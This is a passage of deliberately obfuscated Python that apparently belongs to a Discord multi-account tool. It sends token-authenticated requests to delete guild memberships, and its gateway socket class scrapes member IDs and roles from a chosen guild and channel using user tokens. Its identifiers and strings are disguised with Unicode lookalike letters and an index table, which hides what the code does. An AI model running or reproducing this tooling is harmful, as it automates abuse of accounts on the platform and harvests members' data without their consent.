                                return 𝘳𝘦𝘴𝗽𝙤𝙣𝘴𝙚.json().get(𝙈𝙈𝘕𝘐𝗠𝗜𝗠𝘐𝘭𝗠𝗡𝗡𝘔𝗡𝗹𝙈𝘔𝘭𝙈𝙄𝗹𝗜𝘕𝗜𝗡𝗡𝗜𝘔𝙉𝘕𝗜𝗹[153])
                            except:
                                return 𝙜𝘂𝙞𝙡𝗱
                if not 𝗶𝙣_𝗴𝘶𝙞𝙡𝗱:
                    return 𝙜𝘂𝙞𝘭𝙙
            𝘀𝘦𝘁𝘢𝘵𝘁𝘳(𝘴𝘦𝗹𝘧, 'guild', 𝘨𝘦𝘵_𝙜𝘶𝘪𝙡𝘥_𝘯𝗮𝗺𝗲(𝗴𝙪𝘪𝙡𝘥))
            𝘱𝙖𝘺𝙡𝗼𝘢𝙙 = {𝘔𝘔𝗡𝗜𝙈𝙄𝘔𝙄𝙡𝙈𝘕𝗡𝙈𝗡𝗹𝘔𝗠𝙡𝙈𝙄𝗹𝗜𝗡𝘐𝙉𝗡𝙄𝙈𝘕𝙉𝘐𝗹[154]: False}
            𝘳𝙚𝙨𝘱𝙤𝗻𝘀𝙚 = 𝘀𝘦𝘴𝙨𝘪𝘰𝗻.delete(f'{𝘔𝘔𝙉𝗜𝘔𝙄𝗠𝙄𝘭𝗠𝙉𝘕𝙈𝙉𝘭𝗠𝙈𝘭𝘔𝘐𝙡𝙄𝗡𝙄𝘕𝙉𝗜𝗠𝗡𝘕𝙄𝗹[155]}{𝗴𝙪𝘪𝘭𝙙}', json=𝘱𝗮𝘆𝙡𝘰𝘢𝗱, headers=𝙨𝘦𝘭𝘧.headers(𝘁𝙤𝘬𝗲𝙣))
            match 𝙧𝗲𝘴𝗽𝘰𝘯𝘀𝙚.status_code:
                case 204:
                    𝙥𝘳𝙞𝙣𝘁(f'{𝘔𝗠𝘕𝙄𝗠𝘐𝘔𝗜𝗹𝗠𝙉𝘕𝘔𝘕𝙡𝗠𝙈𝙡𝙈𝙄𝘭𝘐𝙉𝗜𝙉𝘕𝘐𝘔𝙉𝙉𝙄𝘭[91]}{𝘭𝘤}{𝘔𝙈𝗡𝘐𝗠𝗜𝙈𝙄𝗹𝙈𝙉𝗡𝘔𝘕𝗹𝙈𝘔𝗹𝘔𝘐𝙡𝙄𝗡𝙄𝘕𝘕𝙄𝙈𝘕𝙉𝘐𝙡[156]}{𝙧}{𝘔𝘔𝙉𝙄𝙈𝙄𝙈𝗜𝙡𝘔𝙉𝘕𝘔𝘕𝙡𝘔𝗠𝘭𝘔𝙄𝗹𝙄𝙉𝙄𝙉𝙉𝙄𝙈𝙉𝗡𝘐𝗹[157]}', 𝘍𝗼𝗿𝙚.LIGHTGREEN_EX, 𝙩𝘰𝗸𝙚𝘯[:25], 𝘳, 𝘀𝗲𝘭𝘧.guild)
                case _:
                    𝗽𝙧𝗶𝘯𝙩(f'{𝗠𝘔𝘕𝗜𝙈𝘐𝘔𝘐𝙡𝘔𝘕𝙉𝗠𝗡𝗹𝘔𝙈𝘭𝙈𝘐𝗹𝘐𝘕𝙄𝘕𝗡𝙄𝗠𝙉𝗡𝘐𝗹[91]}{𝗹𝙘}{𝙈𝘔𝗡𝙄𝙈𝙄𝘔𝙄𝙡𝗠𝗡𝙉𝗠𝙉𝘭𝘔𝘔𝘭𝗠𝗜𝗹𝘐𝙉𝙄𝙉𝘕𝘐𝘔𝗡𝙉𝗜𝗹[147]}{𝗿}{𝗠𝙈𝘕𝗜𝗠𝗜𝙈𝗜𝙡𝙈𝗡𝗡𝗠𝘕𝘭𝙈𝗠𝙡𝘔𝘐𝘭𝗜𝘕𝙄𝘕𝗡𝙄𝙈𝙉𝙉𝗜𝗹[157]}', 𝗙𝘰𝙧𝙚.LIGHTRED_EX, 𝙩𝗼𝘬𝗲𝗻[:25], 𝘳𝗲𝘀𝘱𝗼𝘯𝘴𝘦.json().get(𝘔𝗠𝙉𝗜𝗠𝗜𝙈𝘐𝗹𝙈𝗡𝘕𝗠𝘕𝘭𝙈𝗠𝘭𝘔𝘐𝙡𝗜𝘕𝘐𝗡𝗡𝗜𝗠𝙉𝙉𝗜𝗹[148]), 𝘳)
        except 𝘌𝙭𝙘𝘦𝘱𝙩𝙞𝗼𝘯 as e:
            𝘱𝘳𝙞𝙣𝙩(f'{𝘔𝗠𝗡𝙄𝙈𝙄𝗠𝗜𝘭𝙈𝘕𝘕𝘔𝗡𝗹𝗠𝗠𝘭𝙈𝙄𝘭𝘐𝗡𝗜𝙉𝙉𝗜𝘔𝙉𝗡𝗜𝘭[91]}{𝗹𝗰}{𝘔𝘔𝙉𝘐𝙈𝗜𝙈𝘐𝗹𝗠𝗡𝗡𝙈𝗡𝙡𝙈𝙈𝗹𝙈𝘐𝘭𝗜𝗡𝗜𝗡𝙉𝗜𝗠𝘕𝘕𝘐𝙡[149]}{𝗿}{𝗠𝘔𝘕𝘐𝘔𝙄𝘔𝘐𝙡𝘔𝙉𝗡𝙈𝗡𝙡𝘔𝘔𝘭𝘔𝙄𝘭𝗜𝗡𝗜𝘕𝙉𝘐𝘔𝘕𝘕𝙄𝗹[157]}', 𝘍𝘰𝘳𝘦.LIGHTRED_EX, 𝗿, 𝘁𝗼𝘬𝙚𝙣[:25], 𝗲)

class Utils:

    def rangeCorrector(ranges):
        if [0, 99] not in 𝗿𝗮𝗻𝙜𝙚𝙨:
            𝘳𝙖𝗻𝙜𝙚𝘀.insert(0, [0, 99])
        return 𝗿𝙖𝘯𝙜𝘦𝘀

    def getRanges(index, multiplier, memberCount):
        𝘪𝗻𝙞𝙩𝙞𝗮𝙡𝙉𝘶𝘮 = 𝗥𝘁𝘬𝗠𝗾𝙧9𝘉𝘝𝙡𝘣𝗡𝗣𝙫𝘳9𝗩𝘃𝘹𝗝𝗤𝙟𝘻7𝗕𝘅𝘴𝘙𝙁𝗡𝗽𝘵.mro()[5](𝙞𝙣𝙙𝗲𝙭 * 𝘮𝙪𝙡𝙩𝗶𝗽𝗹𝙞𝙚𝙧)
        𝘳𝘢𝙣𝙜𝘦𝘀𝙇𝗶𝘀𝘵 = [[𝘪𝗻𝙞𝙩𝘪𝘢𝙡𝘕𝘶𝗺, 𝗶𝗻𝗶𝘁𝘪𝘢𝙡𝗡𝙪𝙢 + 99]]
        if 𝙢𝙚𝗺𝗯𝙚𝙧𝘊𝙤𝙪𝗻𝘁 > 𝘪𝙣𝙞𝘁𝗶𝙖𝗹𝘕𝘂𝙢 + 99:
            𝗿𝙖𝘯𝘨𝗲𝘀𝘓𝗶𝙨𝘵.append([𝘪𝘯𝗶𝘁𝗶𝙖𝙡𝗡𝙪𝙢 + 100, 𝗶𝙣𝗶𝘁𝗶𝙖𝙡𝙉𝘶𝘮 + 199])
        return 𝗨𝙩𝗶𝙡𝙨.rangeCorrector(𝗿𝗮𝙣𝗴𝙚𝘀𝙇𝙞𝙨𝘁)

    def parseGuildMemberListUpdate(response):
        𝙢𝘦𝗺𝘣𝙚𝗿𝘥𝗮𝘵𝗮 = {𝗠𝘔𝘕𝙄𝘔𝗜𝗠𝘐𝙡𝗠𝗡𝙉𝘔𝘕𝘭𝙈𝗠𝗹𝘔𝙄𝙡𝗜𝘕𝗜𝘕𝘕𝗜𝘔𝘕𝘕𝘐𝗹[158]: 𝙧𝘦𝘀𝙥𝙤𝘯𝘀𝗲[𝗠𝘔𝗡𝙄𝗠𝙄𝙈𝗜𝘭𝗠𝗡𝙉𝗠𝘕𝙡𝙈𝗠𝙡𝙈𝘐𝘭𝗜𝗡𝘐𝘕𝙉𝘐𝙈𝘕𝘕𝗜𝘭[166]][𝘔𝙈𝗡𝘐𝘔𝘐𝗠𝗜𝘭𝘔𝗡𝘕𝙈𝙉𝙡𝙈𝙈𝘭𝙈𝘐𝘭𝘐𝙉𝘐𝙉𝙉𝘐𝗠𝘕𝙉𝗜𝘭[158]], 𝗠𝘔𝘕𝙄𝘔𝙄𝙈𝗜𝘭𝗠𝙉𝙉𝘔𝗡𝗹𝙈𝗠𝘭𝗠𝙄𝗹𝙄𝘕𝗜𝙉𝗡𝘐𝘔𝘕𝙉𝘐𝗹[159]: 𝘳𝙚𝘀𝙥𝘰𝙣𝘀𝙚[𝙈𝙈𝗡𝗜𝘔𝗜𝗠𝗜𝗹𝗠𝗡𝗡𝙈𝘕𝘭𝘔𝙈𝗹𝗠𝗜𝙡𝘐𝙉𝗜𝗡𝙉𝗜𝙈𝙉𝙉𝗜𝘭[166]][𝘔𝙈𝘕𝗜𝗠𝘐𝘔𝙄𝙡𝗠𝙉𝙉𝗠𝗡𝗹𝗠𝗠𝗹𝗠𝘐𝘭𝙄𝗡𝘐𝙉𝗡𝗜𝗠𝗡𝗡𝗜𝙡[159]], 𝙈𝗠𝘕𝘐𝘔𝙄𝗠𝙄𝘭𝗠𝗡𝗡𝗠𝗡𝙡𝗠𝙈𝙡𝘔𝙄𝘭𝙄𝙉𝘐𝘕𝙉𝙄𝙈𝙉𝘕𝘐𝘭[160]: 𝘳𝘦𝙨𝘱𝗼𝙣𝘀𝗲[𝘔𝘔𝗡𝙄𝙈𝘐𝗠𝘐𝗹𝗠𝙉𝘕𝗠𝘕𝗹𝗠𝙈𝙡𝙈𝙄𝘭𝙄𝗡𝘐𝘕𝗡𝗜𝙈𝘕𝘕𝘐𝘭[166]][𝘔𝘔𝘕𝙄𝙈𝙄𝘔𝗜𝙡𝗠𝘕𝘕𝙈𝘕𝙡𝗠𝗠𝘭𝗠𝙄𝙡𝘐𝗡𝙄𝗡𝙉𝘐𝗠𝗡𝘕𝘐𝘭[160]], 𝙈𝙈𝘕𝙄𝙈𝙄𝗠𝗜𝗹𝘔𝘕𝗡𝘔𝗡𝗹𝘔𝘔𝙡𝙈𝘐𝘭𝘐𝘕𝙄𝘕𝗡𝙄𝗠𝙉𝘕𝘐𝗹[161]: 𝘳𝗲𝘀𝙥𝘰𝗻𝘀𝙚[𝗠𝙈𝙉𝙄𝘔𝙄𝗠𝘐𝘭𝙈𝘕𝙉𝙈𝘕𝘭𝙈𝘔𝗹𝙈𝙄𝗹𝗜𝗡𝘐𝗡𝙉𝘐𝗠𝙉𝗡𝙄𝘭[166]][𝗠𝘔𝘕𝗜𝘔𝘐𝗠𝗜𝗹𝙈𝗡𝘕𝙈𝘕𝙡𝗠𝘔𝘭𝗠𝗜𝗹𝗜𝙉𝗜𝘕𝗡𝗜𝗠𝗡𝗡𝗜𝘭[161]], 𝘔𝗠𝘕𝘐𝘔𝙄𝙈𝙄𝘭𝘔𝗡𝘕𝘔𝙉𝗹𝙈𝘔𝙡𝗠𝗜𝙡𝘐𝗡𝗜𝗡𝗡𝗜𝗠𝘕𝙉𝙄𝘭[162]: 𝙧𝘦𝘴𝙥𝘰𝙣𝘀𝙚[𝗠𝘔𝘕𝙄𝗠𝙄𝗠𝙄𝘭𝗠𝘕𝙉𝗠𝗡𝙡𝗠𝗠𝗹𝗠𝘐𝙡𝙄𝗡𝙄𝘕𝗡𝗜𝗠𝗡𝗡𝙄𝙡[166]][𝗠𝙈𝙉𝗜𝙈𝗜𝙈𝙄𝙡𝗠𝗡𝘕𝘔𝘕𝘭𝙈𝘔𝗹𝘔𝗜𝙡𝙄𝘕𝗜𝘕𝘕𝘐𝗠𝘕𝙉𝙄𝘭[167]], 𝘔𝗠𝘕𝘐𝘔𝗜𝙈𝙄𝘭𝘔𝗡𝙉𝘔𝘕𝘭𝘔𝘔𝗹𝘔𝗜𝘭𝘐𝘕𝘐𝗡𝙉𝗜𝗠𝘕𝘕𝗜𝗹[163]: [], 𝗠𝘔𝙉𝗜𝗠𝘐𝙈𝙄𝙡𝘔𝗡𝙉𝙈𝗡𝙡𝘔𝗠𝘭𝘔𝘐𝘭𝙄𝗡𝙄𝙉𝙉𝗜𝗠𝙉𝗡𝘐𝙡[164]: [], 𝙈𝗠𝗡𝙄𝘔𝙄𝘔𝘐𝙡𝗠𝗡𝙉𝘔𝗡𝗹𝗠𝘔𝘭𝙈𝘐𝙡𝘐𝗡𝙄𝙉𝘕𝘐𝗠𝗡𝙉𝙄𝘭[165]: []}
        for 𝗰𝘩𝘂𝙣𝗸 in 𝙧𝗲𝙨𝗽𝘰𝗻𝘴𝗲[𝘔𝙈𝘕𝙄𝙈𝙄𝙈𝙄𝗹𝙈𝗡𝙉𝘔𝙉𝗹𝘔𝘔𝙡𝗠𝙄𝗹𝗜𝘕𝙄𝗡𝘕𝘐𝘔𝗡𝙉𝘐𝗹[166]][𝙈𝘔𝙉𝙄𝗠𝗜𝘔𝙄𝗹𝗠𝙉𝗡𝗠𝙉𝙡𝙈𝘔𝘭𝙈𝗜𝘭𝗜𝗡𝗜𝙉𝙉𝙄𝙈𝘕𝙉𝗜𝘭[168]]:
            𝙢𝘦𝗺𝙗𝘦𝘳𝙙𝙖𝘁𝙖[𝗠𝙈𝙉𝗜𝗠𝙄𝘔𝘐𝘭𝘔𝘕𝙉𝙈𝗡𝙡𝘔𝘔𝗹𝗠𝘐𝘭𝙄𝗡𝗜𝘕𝘕𝙄𝙈𝙉𝘕𝗜𝗹[163]].append(𝙘𝙝𝘶𝘯𝘬[𝗠𝘔𝗡𝘐𝙈𝘐𝙈𝗜𝗹𝗠𝘕𝙉𝗠𝘕𝙡𝗠𝙈𝘭𝙈𝙄𝘭𝘐𝗡𝗜𝗡𝙉𝘐𝘔𝙉𝘕𝗜𝗹[169]])
            if 𝘤𝘩𝙪𝙣𝘬[𝗠𝙈𝗡𝘐𝘔𝙄𝘔𝗜𝙡𝘔𝙉𝘕𝙈𝙉𝘭𝘔𝗠𝙡𝘔𝗜𝗹𝙄𝗡𝙄𝘕𝙉𝗜𝗠𝘕𝘕𝙄𝙡[169]] in (𝗠𝗠𝘕𝙄𝗠𝗜𝙈𝘐𝙡𝘔𝙉𝘕𝘔𝘕𝘭𝗠𝙈𝙡𝘔𝗜𝘭𝗜𝙉𝙄𝗡𝘕𝙄𝙈𝘕𝘕𝙄𝗹[170], 𝙈𝗠𝙉𝗜𝙈𝘐𝙈𝗜𝙡𝗠𝗡𝗡𝘔𝗡𝗹𝙈𝗠𝙡𝙈𝗜𝗹𝘐𝘕𝙄𝗡𝘕𝗜𝙈𝘕𝙉𝘐𝗹[171]):
                𝘮𝙚𝙢𝗯𝘦𝘳𝗱𝙖𝙩𝘢[𝗠𝗠𝘕𝙄𝙈𝙄𝙈𝗜𝙡𝙈𝙉𝙉𝘔𝙉𝘭𝙈𝙈𝙡𝗠𝗜𝗹𝘐𝗡𝘐𝙉𝘕𝗜𝘔𝙉𝙉𝘐𝙡[164]].append(𝗰𝗵𝙪𝗻𝙠[𝘔𝘔𝗡𝙄𝘔𝘐𝙈𝗜𝘭𝘔𝙉𝗡𝗠𝘕𝘭𝘔𝗠𝘭𝗠𝙄𝙡𝙄𝗡𝘐𝗡𝘕𝘐𝗠𝘕𝗡𝙄𝙡[172]])
                if 𝙘𝗵𝘶𝗻𝗸[𝘔𝗠𝘕𝘐𝗠𝙄𝘔𝗜𝙡𝗠𝙉𝗡𝙈𝗡𝙡𝙈𝗠𝗹𝙈𝗜𝗹𝘐𝗡𝗜𝘕𝗡𝙄𝗠𝘕𝘕𝙄𝙡[169]] == 𝗠𝘔𝗡𝙄𝘔𝙄𝘔𝗜𝙡𝙈𝙉𝙉𝘔𝗡𝘭𝙈𝙈𝙡𝘔𝗜𝙡𝘐𝘕𝙄𝙉𝗡𝗜𝘔𝘕𝙉𝗜𝘭[170]:
                    𝙢𝘦𝘮𝙗𝗲𝘳𝙙𝘢𝘵𝘢[𝗠𝗠𝘕𝙄𝗠𝙄𝗠𝗜𝙡𝗠𝗡𝘕𝗠𝙉𝗹𝙈𝗠𝗹𝗠𝗜𝙡𝘐𝙉𝘐𝘕𝙉𝘐𝘔𝗡𝙉𝙄𝘭[165]].append(𝘤𝙝𝘂𝘯𝗸[𝘔𝙈𝙉𝘐𝙈𝗜𝗠𝘐𝘭𝘔𝘕𝗡𝗠𝗡𝘭𝙈𝘔𝘭𝙈𝙄𝘭𝗜𝗡𝙄𝘕𝙉𝘐𝙈𝙉𝙉𝗜𝙡[173]])
                else:
                    𝘮𝘦𝗺𝗯𝙚𝗿𝘥𝗮𝙩𝗮[𝙈𝗠𝗡𝗜𝙈𝙄𝗠𝙄𝘭𝗠𝗡𝘕𝘔𝗡𝘭𝘔𝙈𝘭𝘔𝙄𝘭𝘐𝗡𝙄𝘕𝙉𝗜𝙈𝗡𝗡𝙄𝗹[165]].append([])
            elif 𝗰𝘩𝘶𝗻𝗸[𝙈𝘔𝙉𝗜𝙈𝙄𝙈𝗜𝗹𝘔𝗡𝙉𝘔𝘕𝘭𝘔𝘔𝗹𝗠𝙄𝙡𝗜𝘕𝗜𝘕𝙉𝙄𝗠𝙉𝙉𝘐𝙡[169]] in (𝙈𝘔𝙉𝘐𝙈𝗜𝗠𝗜𝙡𝘔𝘕𝘕𝗠𝘕𝗹𝙈𝙈𝗹𝘔𝘐𝘭𝗜𝙉𝗜𝙉𝙉𝘐𝙈𝙉𝘕𝘐𝙡[174], 𝙈𝙈𝘕𝘐𝗠𝙄𝗠𝗜𝘭𝘔𝙉𝙉𝗠𝙉𝘭𝘔𝙈𝘭𝘔𝘐𝗹𝙄𝘕𝗜𝘕𝘕𝙄𝘔𝘕𝗡𝗜𝘭[175], 𝘔𝘔𝘕𝘐𝘔𝗜𝙈𝘐𝙡𝙈𝘕𝙉𝗠𝗡𝙡𝙈𝙈𝘭𝘔𝙄𝗹𝙄𝘕𝗜𝙉𝙉𝗜𝙈𝗡𝘕𝘐𝗹[176]):
                𝘮𝘦𝗺𝘣𝗲𝗿𝗱𝘢𝘁𝗮[𝘔𝙈𝙉𝗜𝗠𝗜𝘔𝙄𝙡𝙈𝙉𝗡𝙈𝙉𝗹𝘔𝗠𝗹𝘔𝘐𝙡𝙄𝗡𝘐𝘕𝙉𝙄𝗠𝙉𝙉𝗜𝙡[164]].append(𝘤𝙝𝘶𝗻𝙠[𝗠𝙈𝙉𝙄𝗠𝙄𝘔𝗜𝘭𝙈𝗡𝗡𝗠𝗡𝙡𝗠𝗠𝘭𝗠𝗜𝙡𝘐𝗡𝗜𝘕𝘕𝙄𝗠𝗡𝗡𝗜𝗹[177]])
                if 𝗰𝗵𝘶𝗻𝗸[𝗠𝗠𝗡𝗜𝙈𝗜𝘔𝘐𝙡𝗠𝙉𝙉𝙈𝘕𝘭𝙈𝙈𝘭𝙈𝙄𝘭𝗜𝗡𝙄𝗡𝗡𝘐𝘔𝘕𝘕𝘐𝙡[169]] == 𝙈𝗠𝙉𝙄𝙈𝘐𝙈𝗜𝗹𝗠𝘕𝙉𝘔𝗡𝗹𝙈𝙈𝙡𝗠𝘐𝗹𝘐𝙉𝙄𝙉𝘕𝙄𝘔𝗡𝘕𝙄𝙡[176]:
                    𝙢𝙚𝗺𝗯𝙚𝗿𝗱𝗮𝘵𝙖[𝘔𝘔𝘕𝘐𝘔𝘐𝗠𝘐𝙡𝘔𝘕𝘕𝙈𝙉𝙡𝘔𝘔𝗹𝘔𝘐𝘭𝗜𝘕𝙄𝙉𝗡𝙄𝙈𝗡𝙉𝙄𝗹[165]].append([])
                else:
                    𝘮𝘦𝗺𝙗𝘦𝗿𝘥𝙖𝙩𝘢[𝗠𝙈𝙉𝙄𝙈𝘐𝘔𝗜𝙡𝘔𝘕𝙉𝗠𝙉𝗹𝙈𝘔𝗹𝗠𝗜𝙡𝘐𝙉𝗜𝗡𝙉𝘐𝙈𝗡𝙉𝗜𝙡[165]].append(𝗰𝗵𝘂𝘯𝗸[𝗠𝘔𝙉𝗜𝘔𝙄𝙈𝘐𝙡𝙈𝙉𝙉𝘔𝗡𝗹𝘔𝗠𝗹𝙈𝙄𝗹𝘐𝙉𝙄𝗡𝘕𝘐𝙈𝙉𝙉𝗜𝙡[178]])
        return 𝗺𝘦𝙢𝗯𝙚𝘳𝘥𝗮𝘵𝘢

class DiscordSocket(𝘸𝙚𝘣𝙨𝗼𝘤𝘬𝘦𝘁.WebSocketApp):

    def __init__(self, token, guild_id, channel_id):
        𝙨𝗲𝘁𝗮𝘁𝘵𝘳(𝘀𝗲𝘭𝗳, 'token', 𝙩𝙤𝘬𝗲𝗻)
        𝘀𝙚𝙩𝗮𝘁𝘵𝙧(𝘴𝘦𝘭𝗳, 'guild_id', 𝗴𝙪𝘪𝗹𝙙_𝗶𝘥)
        𝘀𝗲𝙩𝗮𝙩𝘁𝘳(𝘀𝘦𝙡𝗳, 'channel_id', 𝙘𝙝𝗮𝘯𝙣𝗲𝗹_𝘪𝘥)
        𝘀𝗲𝗹𝙛.blacklisted_roles, 𝙨𝗲𝙡𝘧.blacklisted_users = ([], [])
        𝘀𝘦𝘁𝘢𝘵𝘵𝘳(𝙨𝙚𝙡𝘧, 'socket_headers', {𝘔𝗠𝘕𝘐𝘔𝙄𝗠𝗜𝗹𝘔𝙉𝘕𝗠𝘕𝘭𝘔𝙈𝘭𝗠𝗜𝘭𝗜𝘕𝙄𝙉𝙉𝙄𝙈𝗡𝗡𝗜𝗹[179]: 𝗠𝘔𝗡𝙄𝗠𝗜𝙈𝗜𝙡𝗠𝘕𝙉𝘔𝙉𝙡𝗠𝘔𝙡𝘔𝗜𝙡𝙄𝗡𝘐𝗡𝗡𝗜𝘔𝘕𝘕𝗜𝙡[185], 𝘔𝘔𝗡𝗜𝗠𝗜𝘔𝙄𝘭𝘔𝘕𝘕𝗠𝗡𝗹𝗠𝙈𝗹𝙈𝘐𝗹𝗜𝗡𝘐𝗡𝙉𝘐𝙈𝘕𝗡𝘐𝗹[180]: 𝘔𝘔𝙉𝘐𝘔𝘐𝙈𝘐𝘭𝙈𝗡𝘕𝙈𝗡𝙡𝗠𝗠𝙡𝙈𝗜𝘭𝗜𝘕𝙄𝘕𝘕𝙄𝗠𝗡𝙉𝘐𝙡[186], 𝙈𝙈𝙉𝙄𝙈𝙄𝘔𝗜𝘭𝗠𝙉𝙉𝘔𝙉𝙡𝘔𝙈𝗹𝘔𝗜𝙡𝗜𝗡𝙄𝘕𝗡𝙄𝘔𝘕𝗡𝗜𝘭[181]: 𝙈𝙈𝘕𝘐𝘔𝙄𝙈𝘐𝗹𝗠𝙉𝗡𝙈𝙉𝘭𝗠𝗠𝗹𝗠𝘐𝙡𝙄𝙉𝗜𝘕𝗡𝘐𝗠𝗡𝘕𝘐𝘭[187], 𝗠𝗠𝘕𝘐𝙈𝗜𝗠𝘐𝙡𝙈𝙉𝘕𝙈𝙉𝗹𝙈𝗠𝗹𝘔𝘐𝗹𝘐𝘕𝙄𝙉𝙉𝗜𝘔𝗡𝘕𝙄𝙡[182]: 𝙈𝗠𝙉𝙄𝘔𝘐𝙈𝗜𝘭𝙈𝘕𝗡𝗠𝗡𝙡𝘔𝙈𝙡𝙈𝗜𝗹𝙄𝙉𝙄𝗡𝘕𝘐𝗠𝗡𝗡𝙄𝙡[187], 𝙈𝙈𝘕𝙄𝘔𝗜𝘔𝘐𝗹𝘔𝘕𝘕𝘔𝘕𝙡𝗠𝘔𝙡𝙈𝙄𝗹𝗜𝙉𝙄𝗡𝗡𝘐𝘔𝗡𝘕𝗜𝗹[183]: 𝘔𝘔𝘕𝙄𝗠𝘐𝙈𝙄𝘭𝗠𝗡𝘕𝘔𝘕𝘭𝘔𝘔𝙡𝘔𝘐𝗹𝙄𝗡𝘐𝘕𝗡𝙄𝙈𝗡𝙉𝙄𝙡[188], 𝙈𝘔𝗡𝘐𝗠𝙄𝗠𝗜𝙡𝙈𝙉𝙉𝘔𝗡𝙡𝙈𝘔𝙡𝗠𝙄𝗹𝗜𝘕𝙄𝘕𝙉𝗜𝘔𝗡𝘕𝙄𝙡[184]: 𝙈𝘔𝙉𝗜𝘔𝘐𝙈𝙄𝙡𝗠𝗡𝗡𝘔𝙉𝘭𝗠𝙈𝙡𝗠𝘐𝙡𝘐𝘕𝗜𝙉𝙉𝗜𝘔𝙉𝙉𝗜𝙡[189]})
        𝙨𝘂𝗽𝘦𝘳().__init__(𝙈𝙈𝗡𝙄𝗠𝗜𝘔𝘐𝙡𝘔𝙉𝘕𝗠𝙉𝙡𝙈𝙈𝙡𝘔𝗜𝙡𝙄𝗡𝘐𝘕𝘕𝘐𝘔𝗡𝙉𝗜𝘭[190], header=𝘀𝗲𝗹𝘧.socket_headers, on_open=lambda ws: 𝘀𝙚𝗹𝙛.sock_open(𝘄𝘀), on_message=lambda ws, msg: 𝙨𝙚𝘭𝙛.sock_message(𝙬𝘀, 𝘮𝘴𝗴), on_close=lambda ws, close_code, close_msg: 𝙨𝗲𝙡𝘧.sock_close(𝙬𝘴, 𝗰𝘭𝙤𝘴𝙚_𝙘𝗼𝗱𝙚, 𝘤𝘭𝘰𝙨𝙚_𝘮𝘴𝙜))
        𝘀𝘦𝙩𝘢𝙩𝘵𝙧(𝘴𝗲𝗹𝗳, 'endScraping', False)
        𝙨𝘦𝘁𝗮𝘵𝘵𝘳(𝘀𝙚𝘭𝙛, 'guilds', {})
        𝘀𝙚𝙩𝘢𝘵𝘁𝙧(𝘴𝙚𝗹𝗳, 'members', {})
        𝘀𝙚𝘵𝘢𝘵𝙩𝗿(𝘴𝘦𝙡𝗳, 'ranges', [[0, 0]])
        𝙨𝙚𝘁𝙖𝘁𝙩𝘳(𝙨𝗲𝘭𝙛, 'lastRange', 0)
        𝙨𝙚𝙩𝘢𝘵𝙩𝙧(𝙨𝙚𝙡𝙛, 'packets_recv', 0)

    def run(self):
        𝘀𝘦𝗹𝗳.run_forever()
        return 𝘴𝘦𝘭𝘧.members

    def scrapeUsers(self):
        if 𝘀𝘦𝗹𝙛.endScraping == False:
            𝘴𝗲𝘭𝘧.send(𝘔𝘔𝘕𝗜𝙈𝗜𝘔𝘐𝘭𝘔𝗡𝘕𝙈𝘕𝙡𝙈𝘔𝗹𝗠𝙄𝘭𝘐𝙉𝘐𝗡𝘕𝙄𝘔𝘕𝙉𝙄𝗹[191] + 𝘴𝘦𝙡𝗳.guild_id + 𝙈𝗠𝙉𝙄𝗠𝘐𝗠𝙄𝗹𝘔𝙉𝘕𝗠𝗡𝘭𝙈𝗠𝗹𝘔𝙄𝘭𝙄𝗡𝗜𝗡𝘕𝗜𝘔𝙉𝘕𝘐𝘭[192] + 𝘀𝗲𝘭𝗳.channel_id + 𝙈𝙈𝙉𝙄𝙈𝘐𝗠𝘐𝙡𝙈𝙉𝘕𝙈𝙉𝘭𝘔𝙈𝘭𝘔𝙄𝘭𝘐𝗡𝗜𝙉𝘕𝘐𝗠𝗡𝘕𝙄𝗹[193] + 𝙟𝙨𝗼𝘯.dumps(𝘀𝗲𝘭𝘧.ranges) + 𝙈𝗠𝙉𝘐𝗠𝙄𝗠𝘐𝘭𝘔𝗡𝙉𝙈𝘕𝘭𝗠𝙈𝙡𝘔𝗜𝗹𝗜𝗡𝗜𝙉𝙉𝘐𝗠𝘕𝗡𝙄𝙡[194])

    def sock_open(self, ws):
        𝘴𝙚𝙡𝗳.send(𝗠𝘔𝙉𝗜𝗠𝘐𝙈𝗜𝘭𝗠𝙉𝗡𝙈𝙉𝗹𝗠𝗠𝙡𝙈𝙄𝘭𝙄𝗡𝗜𝗡𝗡𝘐𝗠𝘕𝘕𝙄𝘭[195] + 𝙨𝘦𝘭𝘧.token + 𝘔𝙈𝗡𝘐𝘔𝘐𝘔𝗜𝗹𝙈𝗡𝘕𝘔𝗡𝗹𝘔𝙈𝙡𝙈𝙄𝙡𝘐𝘕𝘐𝗡𝙉𝗜𝘔𝙉𝘕𝘐𝙡[196])

    def heartbeatThread(self, interval):
        try:
            while True:
                𝙨𝗲𝘭𝙛.send(𝗠𝗠𝙉𝘐𝙈𝗜𝙈𝙄𝘭𝘔𝙉𝙉𝗠𝙉𝙡𝗠𝘔𝘭𝙈𝗜𝘭𝙄𝘕𝗜𝘕𝘕𝗜𝘔𝗡𝘕𝘐𝙡[197] + 𝙍𝘴𝘽𝗦𝙢𝙎𝘍0𝙙𝗧𝗻𝗾𝙏𝗞𝙅𝘖𝙏2𝙯𝘖1𝘳𝗧𝘝𝘁𝗸𝘗𝘚𝗮𝙃𝙞𝘞.mro()[7](𝘴𝗲𝗹𝗳.packets_recv) + 𝙈𝙈𝗡𝗜𝘔𝗜𝙈𝘐𝘭𝗠𝘕𝗡𝘔𝙉𝘭𝘔𝘔𝙡𝘔𝙄𝗹𝘐𝙉𝙄𝗡𝙉𝙄𝘔𝗡𝙉𝗜𝗹[198])
                𝘵𝘪𝘮𝗲.sleep(𝘪𝘯𝘵𝘦𝘳𝘷𝗮𝙡)
        except 𝗘𝘅𝙘𝙚𝘱𝘵𝗶𝘰𝗻 as e:
            pass
            return

    def sock_message(self, ws, message):
        𝗱𝙚𝗰𝙤𝘥𝙚𝗱 = 𝗷𝙨𝗼𝘯.loads(𝘮𝙚𝘴𝙨𝙖𝙜𝙚)
        if 𝗱𝘦𝙘𝗼𝗱𝘦𝙙 is None:
            return
        if 𝗱𝗲𝗰𝙤𝗱𝗲𝘥[𝘔𝗠𝘕𝙄𝗠𝘐𝗠𝗜𝙡𝗠𝙉𝘕𝘔𝙉𝙡𝗠𝗠𝗹𝙈𝙄𝙡𝗜𝙉𝗜𝙉𝘕𝘐𝙈𝘕𝘕𝙄𝘭[169]] != 11:
            𝘀𝘦𝙡𝗳.packets_recv += 1
        if 𝘥𝗲𝗰𝗼𝘥𝗲𝘥[𝙈𝙈𝘕𝙄𝘔𝙄𝗠𝙄𝘭𝘔𝘕𝙉𝙈𝙉𝗹𝗠𝗠𝙡𝗠𝘐𝘭𝙄𝘕𝗜𝗡𝘕𝙄𝙈𝘕𝙉𝗜𝘭[169]] == 10:
